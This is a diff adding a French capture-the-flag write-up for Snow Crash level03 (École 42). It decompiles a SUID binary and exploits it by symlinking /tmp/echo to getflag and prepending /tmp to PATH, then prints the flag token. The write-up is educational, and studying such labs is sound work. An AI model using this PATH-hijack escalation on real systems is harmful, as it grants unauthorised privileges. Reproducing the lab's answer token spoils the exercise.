@@ -1,10 +1,87 @@
-On a un executable a exploit
+# Level 03 – Snow Crash – École 42
 
-level03@SnowCrash:~$ ls -asl
-total 24
- 0 dr-x------ 1 level03 level03  120 Mar  5  2016 .
- 0 d--x--x--x 1 root    users    340 Aug 30  2015 ..
- 4 -r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
- 4 -r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-12 -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
- 4 -r-x------ 1 level03 level03  675 Apr  3  2012 .profile
+## 🎯 Objectif
+Exploiter un binaire `level03` pour obtenir les droits de l’utilisateur `flag03` et récupérer le flag via `getflag`.
+
+---
+
+## 📄 Analyse des fichiers
+
+Contenu du répertoire `/home/user/level03/` :
+```
+-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
+```
+
+Le binaire `level03` est **exécutable avec les permissions SUID**, ce qui signifie qu’il s’exécute avec les droits de `flag03`.
+
+---
+
+## 🔍 Étapes d'analyse
+
+### 1. 🔁 Récupération du binaire
+On copie le binaire en local pour l’analyser avec un outil de reverse engineering comme **Ghidra** :
+```bash
+scp -P 4242 level03@localhost:/home/user/level03/level03 ./
+```
+
+### 2. 🧠 Résultat de l’analyse Ghidra
+
+```c
+int main(int argc,char **argv,char **envp) {
+  __gid_t __rgid;
+  __uid_t __ruid;
+  int iVar1;
+  gid_t gid;
+  uid_t uid;
+
+  __rgid = getegid();
+  __ruid = geteuid();
+  setresgid(__rgid,__rgid,__rgid);
+  setresuid(__ruid,__ruid,__ruid);
+  iVar1 = system("/usr/bin/env echo Exploit me");
+  return iVar1;
+}
+```
+
+Ce code appelle la commande :
+```bash
+/usr/bin/env echo Exploit me
+```
+Ce qui signifie que **la commande `echo` est trouvée dans le `$PATH`**, et exécutée.
+
+---
+
+## 💥 Exploitation
+
+Le binaire utilise `env` pour lancer `echo`, donc on peut :
+1. Créer un faux `echo` dans `/tmp` qui redirige vers `getflag`
+2. Modifier le `$PATH` pour pointer en priorité vers `/tmp`
+
+### Commandes :
+```bash
+ln -sf /bin/getflag /tmp/echo
+export PATH=/tmp:$PATH
+./level03
+```
+
+---
+
+## ✅ Flag obtenu
+
+```
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+```
+
+---
+
+## 🧠 Leçon retenue
+
+> Lorsqu’un binaire SUID utilise une commande shell avec `env` ou dépend du `$PATH`,  
+> **il est souvent possible d’injecter une commande personnalisée** si l’environnement n’est pas correctement verrouillé.
+
+---
+
+## 📁 Fichiers
+
+- `flag` : contient le flag obtenu
+- `ressources/` : contient ce `README.md` + binaire analysé (localement)
